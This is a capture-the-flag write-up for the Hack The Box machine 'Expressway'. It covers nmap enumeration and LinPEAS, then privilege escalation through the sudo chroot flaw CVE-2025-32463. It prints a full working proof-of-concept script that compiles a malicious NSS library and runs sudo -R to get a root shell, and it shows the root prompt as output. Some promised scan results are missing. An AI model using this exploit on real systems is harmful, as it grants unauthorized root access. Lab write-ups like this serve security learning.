## Introduction

Expressway is an easy difficulty Linux machine on Hack The Box released in 20<sup>th</sup> September 2025, created by the user
[dakkmaddy](https://app.hackthebox.com/users/17571). It focuses on isakmp service and exploiting a vulnerability in sudo for privilege escalation.

### Enumeration

As usual I started with nmap scan to enumerate open ports and services.

```bash
nmap -sC -sV -sS -O -A -p- -v <IP_ADDRESS>
```

The nmap scan results showed that the target machine has the following open ports and services:

The ssh service is running OpenSSH 10.0p2 on Debian 8, hared for security. So no chance of exploiting it.

I turned for UPD scan to check for any open UDP ports.

### Privilege Escalation

To enumerate possible privilege escalation vectors, I used **[LinPEAS](https://www.kali.org/tools/peass-ng/)** script which is a popular post-exploitation enumeration tool for Linux systems.
Transfer the linpeas.sh script to target machine using **python3 -m http.server** or any method you prefer scp, wget etc.

```bash
$ ./linpeas.sh
```
Till the linpeas.sh script was running I found a interesting finding in the output related to **sudo privileges**.
```
ike@expressway:~$ whoami
ike
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ uname -a
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64 GNU/Linux
ike@expressway:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password:
Sorry, user ike may not run sudo on expressway.
```

The linpeas output showed that the sudo version is vulnerable to privilege escalation [CVE-2025-32463](https://www.exploit-db.com/exploits/52352),
where an attacker can leverage sudo's -R (--chroot) option to runarbitrary commands as root, even if they are not listed in thesudoers file.
Sudo versions 1.9.14 to 1.9.17 inclusive are affected.

To exploit this I ran the following script to get root shell.

```bash
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 */
    setregid(0,0);          /* change  to GID 0 */
    chdir("/");             /* exit from chroot */
    execl("/bin/bash","/bin/bash",NULL); /* root shell */
}
EOF

# 2. Mini chroot with toxic nsswitch.conf
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. compile libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot                 # (-R <dir> <cmd>)
                                   # • the first “woot” is chroot
                                   # • the second “woot” is and inexistent
command
                                   #   (only needs resolve the user)

rm -rf "$STAGE"
```

To get root shell I executed the above script as follows:

```bash
$ nano exploit.sh
# paste the script content and save it
$ chmod +x exploit.sh
$ ./exploit.sh
[*] Running exploit…

root@expressway:/# cd root

```

I got root flag successfully.
